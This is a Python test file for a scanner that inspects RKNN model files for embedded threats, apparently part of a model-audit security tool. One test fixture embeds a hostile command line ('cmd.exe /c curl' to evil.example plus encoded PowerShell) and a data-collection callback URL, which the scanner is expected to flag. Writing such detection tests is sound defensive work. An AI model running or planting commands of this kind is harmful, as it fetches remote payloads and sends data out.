"""Tests for RKNN scanner support."""

from __future__ import annotations

from pathlib import Path

from modelaudit import core
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.rknn_scanner import RknnScanner


def _write_rknn_file(tmp_path: Path, payload: bytes, filename: str = "model.rknn") -> Path:
    path = tmp_path / filename
    path.write_bytes(payload)
    return path


def test_can_handle_valid_rknn_file(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00model_name=resnet50\nruntime=rockchip\ninput=224x224\n"
    path = _write_rknn_file(tmp_path, payload)

    assert RknnScanner.can_handle(str(path))


def test_can_handle_rejects_non_rknn_content(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"not-rknn-binary-content", filename="fake.rknn")

    assert not RknnScanner.can_handle(str(path))


def test_scan_benign_rknn_no_critical_findings(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"model_name=resnet50\n"
        b"model_version=1.0\n"
        b"runtime=rockchip\n"
        b"target=rk3588\n"
        b"quantization=int8\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="safe.rknn")

    result = RknnScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="malicious.rknn")

    result = RknnScanner().scan(str(path))

    correlated = [
        check
        for check in result.checks
        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
    ]
    assert len(correlated) == 1
    assert correlated[0].severity == IssueSeverity.CRITICAL


def test_scan_handles_truncated_rknn_gracefully(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN", filename="truncated.rknn")

    result = RknnScanner().scan(str(path))
    structural_failures = [check for check in result.checks if check.name == "RKNN Structural Integrity"]
    assert len(structural_failures) == 1
    assert structural_failures[0].status == CheckStatus.FAILED
    assert result.success is False


def test_regression_rknn_routes_to_dedicated_scanner(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00model_name=demo\nruntime=rockchip\n")

    result = core.scan_file(str(path))
    assert result.scanner_name == "rknn"
    assert result.scanner_name != "unknown"


def test_false_positive_high_entropy_blob_is_not_critical(tmp_path: Path) -> None:
    high_entropy_like = b"A" * 220 + b"\nmetadata=benchmark\n"
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00" + high_entropy_like, filename="entropy.rknn")

    result = RknnScanner().scan(str(path))
    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_false_positive_common_labels_do_not_trigger_command_alert(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00label=execute_mode_fast\ndescription=network_ready_model\nruntime=rockchip\n"
    path = _write_rknn_file(tmp_path, payload, filename="labels.rknn")

    result = RknnScanner().scan(str(path))
    command_failures = [
        check
        for check in result.checks
        if check.name in {"RKNN Command Indicator Detection", "RKNN Command and Network Indicator Correlation"}
        and check.status == CheckStatus.FAILED
    ]
    assert len(command_failures) == 0
